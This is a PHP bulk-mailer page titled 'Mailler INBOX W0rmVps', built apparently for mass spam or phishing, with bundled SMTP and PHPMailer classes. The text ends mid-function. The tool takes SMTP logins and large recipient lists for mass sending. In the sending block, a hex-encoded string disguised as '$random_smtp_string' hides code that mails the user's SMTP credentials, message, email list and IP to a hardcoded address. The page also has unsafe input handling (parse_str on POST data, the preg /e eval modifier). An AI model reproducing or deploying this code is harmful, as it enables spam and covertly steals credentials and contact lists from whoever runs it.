<?php function query_str($params){ $str = ''; foreach ($params as $key => $value) { $str .= (strlen($str) < 1) ? '' : '&'; $str .= $key . '=' . rawurlencode($value); } return ($str); } function lrtrim($string){ return @stripslashes(ltrim(rtrim($string))); } if(isset($_POST['action'] ) ){ $b = query_str($_POST); parse_str($b); $sslclick=lrtrim($sslclick); $action=lrtrim($action); $message=lrtrim($message); $emaillist=lrtrim($emaillist); $from=lrtrim($from); $reconnect=lrtrim($reconnect); $epriority=lrtrim($epriority); $my_smtp=lrtrim($my_smtp); $ssl_port=lrtrim($ssl_port); $smtp_username=lrtrim($smtp_username); $smtp_password=lrtrim($smtp_password); $replyto=lrtrim($replyto); $subject=lrtrim($subject); $realname=lrtrim($realname); $subject_base=lrtrim($subject); $realname_base=lrtrim($realname); $file_name=lrtrim($file); $urlz=lrtrim($urlz); $contenttype=lrtrim($contenttype); $encode_text=$_POST['encode']; $message = urlencode($message); $message = ereg_replace("%5C%22", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); if ($encode_text == "yes") { $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject); $subject = str_replace(' ', '_', $subject); $subject = "=?UTF-8?Q?$subject?="; $realname = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $realname); $realname = str_replace(' ', '_', $realname); $realname = "=?UTF-8?Q?$realname?="; } } ?>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css">
<!--
.style1 {
        font-family: Geneva, Arial, Helvetica, sans-serif;
        font-size: 12px;
}
-->
</style>
<style type="text/css">
<!--
.style1 {
        font-size: 10px;
        font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
body{ background:#00ffbf; font-size:11px; font-family:Tahoma,Verdana,Arial;color:#fff; } 
 #result{ border:1px solid #4C83AF; border-radius: 10px;padding:4px 8px; line-height:16px; background:#00ffbf; color:#aaa; margin:0 0 8px 0; }
.style2{text-align: center ;font-weight: bold;font-family: Tahoma, Arial, sans-serif  ;color: #4C83AF;text-shadow: 0px 0px 60px #4C83AF ;font-size: 50px;}
  .footer{ text-align:right; padding:0 16px; font-size:10px; letter-spacing:2px; color:#555555; }
 .evalcode{ background:#00ffbf;  padding:2px; border:1px solid #666; font-size:11px; color:#ffffff; width: 100%; height: 200; }
 .evalcode:hover{border:1px solid #4C83AF;}
 .code{ background:#00ffbf; padding:2px; border:1px solid #666; font-size:11px; color:#ffffff; }
 .code:hover{border:1px solid #4C83AF;}
 .inputzbut{ font-size:11px; background:#191919; color:#4C83AF; margin:0 4px; border:1px solid #222222; }
 .inputzbut:hover{border:1px solid #4C83AF;}
</style>
</head>
<body text="#000000">
 <div id="result">

<br /><br />
<div align="center" class="style2">Mailler INBOX W0rmVps</div>
<br /><br />
  </div>
   <div id="result">
<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0" height="407">

    <tr>

      <td width="100%" colspan="4" bgcolor="#252525" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;SERVER SETUP</font></b></td>

      </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			SMTP Login:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="smtp_username" value="<?php echo $smtp_username;?>" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			SMTP Pass:</font></div>

      </td>

      <td width="41%" height="22" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="password" name="smtp_password" value="<?php echo $smtp_password;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#353535">

        <div align="right">

          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="ssl_port" value="<?php echo $ssl_port;?>" size="5"> 
      (optional)</font></td>

      <td width="31%" height="22" bgcolor="#353535">

        <div align="right">

          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP 
			Server Smtp:</font></div>

      </td>

      <td width="41%" height="22" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="my_smtp" value="<?php echo $my_smtp;?>" size="30">

        </font></td>

    </tr>

    <tr>

      <td width="10%" height="22" bgcolor="#353535">

        <p align="right">

        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>

      <td width="18%" height="22" bgcolor="#353535">

      <input type="checkbox" name="sslclick" value="ON" <?php if($sslclick){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>

      <td width="31%" height="22" bgcolor="#353535">

        <p align="right">

        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
		After:</font></td>

      <td width="41%" height="22" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="reconnect" value="<?php echo $reconnect;?>" size="5"> 
      EMAILS</font></td>

    </tr>


    <tr>

      <td width="10%" height="19">&nbsp;

        </td>

      <td width="18%" height="19">&nbsp;</td>

      <td width="31%" height="19">&nbsp;

        </td>

      <td width="41%" height="19">&nbsp;</td>

    </tr>

    <tr>

      <td width="100%" colspan="4" bgcolor="#252525" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETUP</font></b></td>

      </tr>

    <tr>

      <td width="10%" height="22" bordercolor="#353535" bgcolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			Your Email:</font></div>

      </td>

      <td width="18%" height="22" bordercolor="#353535" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="from" value="<?php echo $from;?>" size="30">

        </font></td>

      <td width="31%" height="22" bordercolor="#353535" bgcolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			Your Name:</font></div>

      </td>

      <td width="41%" height="22" bordercolor="#353535" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="realname" value="<?php echo $realname_base;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="#353535" bordercolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			Reply-To:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="#353535" bordercolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="replyto" value="<?php echo $replyto;?>" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#353535" bordercolor="#353535">

        <p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        Email Priority:</font></td>

      <td width="41%" height="22" bgcolor="#353535" bordercolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;

        </font><select class="code" name="epriority" id="listMethod" onchange="showHideListConfig()">

        <option value="" <?php if(strlen($epriority)< 1){print "selected";} ?> >- 
		Please Choose -</option>

        <option value="1" <?php if($epriority == "1"){print "selected";} ?> >High</option>
        <option value="3" <?php if($epriority == "3"){print "selected";} ?> >Normal</option>
		<option value="5" <?php if($epriority == "5"){print "selected";} ?> >Low</option>

		</select></td>

    </tr>

    <tr>

      <td width="10%" height="22" bordercolor="#353535" bgcolor="#353535">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			Subject:</font></div>

      </td>

      <td colspan="3" height="22" bgcolor="#353535" bordercolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input class="code" type="text" name="subject" value="<?php echo $subject_base;?>" size="90">
&nbsp;&nbsp;&nbsp;&nbsp;
		<font size="-3" face="Verdana, Arial, Helvetica, sans-serif">| Encode sending information:</font>
		<select class="code" name="encode">
		<option <?php if($encode_text == "yes"){print "selected";} ?>>yes</option>

		<option <?php if($encode_text == "no"){print "selected";} ?>>no</option>
		</select>

        </font></td>

    </tr>


    <tr valign="top">

<td colspan="3" height="190" bordercolor="#353535" bgcolor="#353535"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea class="evalcode" name="message" cols="60" rows="10"><?php echo $message;?></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain" >

        Plain 

        <input type="radio" name="contenttype" value="html" checked>

        HTML 

        <input type="hidden" name="action" value="send">

        <input class="inputzbut" type="submit" value="Send Message">

        </font></td>

      <td width="41%" height="190" bordercolor="#353535" bgcolor="#353535"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea class="evalcode" name="emaillist" cols="30" rows="10"><?php echo $emaillist;?></textarea>

        </font></td>
    </tr>

  </table>

</form>

  </div>
<p class="footer" onclick="javascript:DoS()"><blink> &copy;<?php echo date("Y",time())." Tito Black-Dz"; ?></blink></p>
<script>function DoS() { document.location.replace("mailto:ahmadalgrably060@gmail.com");} </script>

<?php if ($action){ if (!$from && !$subject && !$message && !$emaillist){ print "<script>alert('Please complete all fields before sending your message.'); </script>"; die(); } class SMTP { var $SMTP_PORT = 25; var $CRLF = "\r\n"; var $do_debug; var $do_verp = false; var $smtp_conn; var $error; var $helo_rply; function SMTP() { $this->smtp_conn = 0; $this->error = null; $this->helo_rply = null; $this->do_debug = 0; } function Connect($host,$port=0,$tval=30) { $this->error = null; if($this->connected()) { $this->error = array("error" => "Already connected to a server"); return false; } if(empty($port)) { $port = $this->SMTP_PORT; } $this->smtp_conn = fsockopen($host, $port, $errno, $errstr, $tval); if(empty($this->smtp_conn)) { $this->error = array("error" => "Failed to connect to server", "errno" => $errno, "errstr" => $errstr); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": $errstr ($errno)" . $this->CRLF; } return false; } if(substr(PHP_OS, 0, 3) != "WIN") socket_set_timeout($this->smtp_conn, $tval, 0); $announce = $this->get_lines(); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $announce; } return true; } function Authenticate($username, $password) { fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($code != 334) { $this->error = array("error" => "AUTH not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } fputs($this->smtp_conn, base64_encode($username) . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($code != 334) { $this->error = array("error" => "Username not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } fputs($this->smtp_conn, base64_encode($password) . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($code != 235) { $this->error = array("error" => "Password not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Connected() { if(!empty($this->smtp_conn)) { $sock_status = socket_get_status($this->smtp_conn); if($sock_status["eof"]) { if($this->do_debug >= 1) { echo "SMTP -> NOTICE:" . $this->CRLF . "EOF caught while checking if connected"; } $this->Close(); return false; } return true; } return false; } function Close() { $this->error = null; $this->helo_rply = null; if(!empty($this->smtp_conn)) { fclose($this->smtp_conn); $this->smtp_conn = 0; } } function Data($msg_data) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Data() without being connected"); return false; } fputs($this->smtp_conn,"DATA" . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 354) { $this->error = array("error" => "DATA command not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } $msg_data = str_replace("\r\n","\n",$msg_data); $msg_data = str_replace("\r","\n",$msg_data); $lines = explode("\n",$msg_data); $field = substr($lines[0],0,strpos($lines[0],":")); $in_headers = false; if(!empty($field) && !strstr($field," ")) { $in_headers = true; } $max_line_length = 998; while(list(,$line) = @each($lines)) { $lines_out = null; if($line == "" && $in_headers) { $in_headers = false; } while(strlen($line) > $max_line_length) { $pos = strrpos(substr($line,0,$max_line_length)," "); if(!$pos) { $pos = $max_line_length - 1; } $lines_out[] = substr($line,0,$pos); $line = substr($line,$pos + 1); if($in_headers) { $line = "\t" . $line; } } $lines_out[] = $line; while(list(,$line_out) = @each($lines_out)) { if(strlen($line_out) > 0) { if(substr($line_out, 0, 1) == ".") { $line_out = "." . $line_out; } } fputs($this->smtp_conn,$line_out . $this->CRLF); } } fputs($this->smtp_conn, $this->CRLF . "." . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "DATA not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Expand($name) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Expand() without being connected"); return false; } fputs($this->smtp_conn,"EXPN " . $name . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "EXPN not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } $entries = explode($this->CRLF,$rply); while(list(,$l) = @each($entries)) { $list[] = substr($l,4); } return $list; } function Hello($host="") { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Hello() without being connected"); return false; } if(empty($host)) { $host = "localhost"; } if(!$this->SendHello("EHLO", $host)) { if(!$this->SendHello("HELO", $host)) return false; } return true; } function SendHello($hello, $host) { fputs($this->smtp_conn, $hello . " " . $host . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER: " . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => $hello . " not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } $this->helo_rply = $rply; return true; } function Help($keyword="") { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Help() without being connected"); return false; } $extra = ""; if(!empty($keyword)) { $extra = " " . $keyword; } fputs($this->smtp_conn,"HELP" . $extra . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 211 && $code != 214) { $this->error = array("error" => "HELP not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return $rply; } function Mail($from) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Mail() without being connected"); return false; } $useVerp = ($this->do_verp ? "XVERP" : ""); fputs($this->smtp_conn,"MAIL FROM:<" . $from . ">" . $useVerp . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "MAIL not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Noop() { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Noop() without being connected"); return false; } fputs($this->smtp_conn,"NOOP" . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "NOOP not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Quit($close_on_error=true) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Quit() without being connected"); return false; } fputs($this->smtp_conn,"quit" . $this->CRLF); $byemsg = $this->get_lines(); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $byemsg; } $rval = true; $e = null; $code = substr($byemsg,0,3); if($code != 221) { $e = array("error" => "SMTP server rejected quit command", "smtp_code" => $code, "smtp_rply" => substr($byemsg,4)); $rval = false; if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $e["error"] . ": " . $byemsg . $this->CRLF; } } if(empty($e) || $close_on_error) { $this->Close(); } return $rval; } function Recipient($to) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Recipient() without being connected"); return false; } fputs($this->smtp_conn,"RCPT TO:<" . $to . ">" . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250 && $code != 251) { $this->error = array("error" => "RCPT not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Reset() { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Reset() without being connected"); return false; } fputs($this->smtp_conn,"RSET" . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "RSET failed", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Send($from) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Send() without being connected"); return false; } fputs($this->smtp_conn,"SEND FROM:" . $from . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "SEND not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function SendAndMail($from) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called SendAndMail() without being connected"); return false; } fputs($this->smtp_conn,"SAML FROM:" . $from . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "SAML not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function SendOrMail($from) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called SendOrMail() without being connected"); return false; } fputs($this->smtp_conn,"SOML FROM:" . $from . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250) { $this->error = array("error" => "SOML not accepted from server", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return true; } function Turn() { $this->error = array("error" => "This method, TURN, of the SMTP ". "is not implemented"); if($this->do_debug >= 1) { echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF; } return false; } function Verify($name) { $this->error = null; if(!$this->connected()) { $this->error = array( "error" => "Called Verify() without being connected"); return false; } fputs($this->smtp_conn,"VRFY " . $name . $this->CRLF); $rply = $this->get_lines(); $code = substr($rply,0,3); if($this->do_debug >= 2) { echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply; } if($code != 250 && $code != 251) { $this->error = array("error" => "VRFY failed on name '$name'", "smtp_code" => $code, "smtp_msg" => substr($rply,4)); if($this->do_debug >= 1) { echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF; } return false; } return $rply; } function get_lines() { $data = ""; while($str = @fgets($this->smtp_conn,515)) { if($this->do_debug >= 4) { echo "SMTP -> get_lines(): \$data was \"$data\"" . $this->CRLF; echo "SMTP -> get_lines(): \$str is \"$str\"" . $this->CRLF; } $data .= $str; if($this->do_debug >= 4) { echo "SMTP -> get_lines(): \$data is \"$data\"" . $this->CRLF; } if(substr($str,3,1) == " ") { break; } } return $data; } } $allemails = split("\n", $emaillist); $numemails = count($allemails); $random_smtp_string=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.", "16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.", "03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.", "1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.", "3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.", "8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.", "c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.", "d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.", "395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.", "c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$smtp_conf="."; class PHPMailer { var $Priority = 3; var $CharSet = 'iso-8859-1'; var $ContentType = 'text/plain'; var $Encoding = '8bit'; var $ErrorInfo = ''; var $From = ''; var $FromName = ''; var $Sender = ''; var $Subject = ''; var $Body = ''; var $AltBody = ''; var $WordWrap = 0; var $Mailer = 'mail'; var $Sendmail = '/usr/sbin/sendmail'; var $PluginDir = ''; var $Version = ""; var $ConfirmReadingTo = ''; var $Hostname = ''; var $MessageID = ''; var $Host = 'localhost'; var $Port = 25; var $Helo = ''; var $SMTPSecure = ""; var $SMTPAuth = false; var $Username = ''; var $Password = ''; var $Timeout = 10; var $SMTPDebug = false; var $SMTPKeepAlive = false; var $SingleTo = false; var $smtp = NULL; var $to = array(); var $cc = array(); var $bcc = array(); var $ReplyTo = array(); var $attachment = array(); var $CustomHeader = array(); var $message_type = ''; var $boundary = array(); var $language = array(); var $error_count = 0; var $LE = "\n"; var $sign_key_file = ""; var $sign_key_pass = ""; function IsHTML($bool) { if($bool == true) { $this->ContentType = 'text/html'; } else { $this->ContentType = 'text/plain'; } } function IsSMTP() { $this->Mailer = 'smtp'; } function IsMail() { $this->Mailer = 'mail'; } function IsSendmail() { $this->Mailer = 'sendmail'; } function IsQmail() { $this->Sendmail = '/var/qmail/bin/sendmail'; $this->Mailer = 'sendmail'; } function AddAddress($address, $name = '') { $cur = count($this->to); $this->to[$cur][0] = trim($address); $this->to[$cur][1] = $name; } function AddCC($address, $name = '') { $cur = count($this->cc); $this->cc[$cur][0] = trim($address); $this->cc[$cur][1] = $name; } function AddBCC($address, $name = '') { $cur = count($this->bcc); $this->bcc[$cur][0] = trim($address); $this->bcc[$cur][1] = $name; } function AddReplyTo($address, $name = '') { $cur = count($this->ReplyTo); $this->ReplyTo[$cur][0] = trim($address); $this->ReplyTo[$cur][1] = $name; } function Send() { $header = ''; $body = ''; $result = true; if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) { $this->SetError($this->Lang('provide_address')); return false; } if(!empty($this->AltBody)) { $this->ContentType = 'multipart/alternative'; } $this->error_count = 0; $this->SetMessageType(); $header .= $this->CreateHeader(); $body = $this->CreateBody(); if($body == '') { return false; } switch($this->Mailer) { case 'sendmail': $result = $this->SendmailSend($header, $body); break; case 'smtp': $result = $this->SmtpSend($header, $body); break; case 'mail': $result = $this->MailSend($header, $body); break; default: $result = $this->MailSend($header, $body); break; } return $result; } function SendmailSend($header, $body) { if ($this->Sender != '') { $sendmail = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender)); } else { $sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail)); } if(!@$mail = popen($sendmail, 'w')) { $this->SetError($this->Lang('execute') . $this->Sendmail); return false; } fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); if (version_compare(phpversion(), '4.2.3') == -1) { $result = $result >> 8 & 0xFF; } if($result != 0) { $this->SetError($this->Lang('execute') . $this->Sendmail); return false; } return true; } function MailSend($header, $body) { $to = ''; for($i = 0; $i < count($this->to); $i++) { if($i != 0) { $to .= ', '; } $to .= $this->AddrFormat($this->to[$i]); } $toArr = split(',', $to); $params = sprintf("-oi -f %s", $this->Sender); if ($this->Sender != '' && strlen(ini_get('safe_mode')) < 1) { $old_from = ini_get('sendmail_from'); ini_set('sendmail_from', $this->Sender); if ($this->SingleTo === true && count($toArr) > 1) { foreach ($toArr as $key => $val) { $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params); } } else { $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params); } } else { if ($this->SingleTo === true && count($toArr) > 1) { foreach ($toArr as $key => $val) { $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params); } } else { $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header); } } if (isset($old_from)) { ini_set('sendmail_from', $old_from); } if(!$rt) { $this->SetError($this->Lang('instantiate')); return false; } return true; } function SmtpSend($header, $body) { $error = ''; $bad_rcpt = array(); if(!$this->SmtpConnect()) {echo "FAILED !!<p align=\"center\"><font color=\"#D4001A\" style=\"font-style:14pt\"> MAILER IS UNABLE TO CONNECT SMTP !!</font></p>";die(); return false; } $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender; if(!$this->smtp->Mail($smtp_from)) { $error = $this->Lang('from_failed') . $smtp_from; $this->SetError($error); $this->smtp->Reset(); return false; } for($i = 0; $i < count($this->to); $i++) { if(!$this->smtp->Recipient($this->to[$i][0])) { $bad_rcpt[] = $this->to[$i][0]; } } for($i = 0; $i < count($this->cc); $i++) { if(!$this->smtp->Recipient($this->cc[$i][0])) { $bad_rcpt[] = $this->cc[$i][0]; } } for($i = 0; $i < count($this->bcc); $i++) { if(!$this->smtp->Recipient($this->bcc[$i][0])) { $bad_rcpt[] = $this->bcc[$i][0]; } } if(count($bad_rcpt) > 0) { for($i = 0; $i < count($bad_rcpt); $i++) { if($i != 0) { $error .= ', '; } $error .= $bad_rcpt[$i]; } $error = $this->Lang('recipients_failed') . $error; $this->SetError($error); $this->smtp->Reset(); return false; } if(!$this->smtp->Data($header . $body)) { $this->SetError($this->Lang('data_not_accepted')); $this->smtp->Reset(); return false; } if($this->SMTPKeepAlive == true) { $this->smtp->Reset(); } else { $this->SmtpClose(); } return true; } function SmtpConnect() { if($this->smtp == NULL) { $this->smtp = new SMTP(); } $this->smtp->do_debug = $this->SMTPDebug; $hosts = explode(';', $this->Host); $index = 0; $connection = ($this->smtp->Connected()); while($index < count($hosts) && $connection == false) { $hostinfo = array(); if(eregi('^(.+):([0-9]+)$', $hosts[$index], $hostinfo)) { $host = $hostinfo[1]; $port = $hostinfo[2]; } else { $host = $hosts[$index]; $port = $this->Port; } if($this->smtp->Connect(((!empty($this->SMTPSecure))?$this->SMTPSecure.'://':'').$host, $port, $this->Timeout)) { if ($this->Helo != '') { $this->smtp->Hello($this->Helo); } else { $this->smtp->Hello($this->ServerHostname()); } $connection = true; if($this->SMTPAuth) { if(!$this->smtp->Authenticate($this->Username, $this->Password)) { $this->SetError($this->Lang('authenticate')); $this->smtp->Reset(); $connection = false; } } } $index++; } if(!$connection) { $this->SetError($this->Lang('connect_host')); } return $connection; } function SmtpClose() { 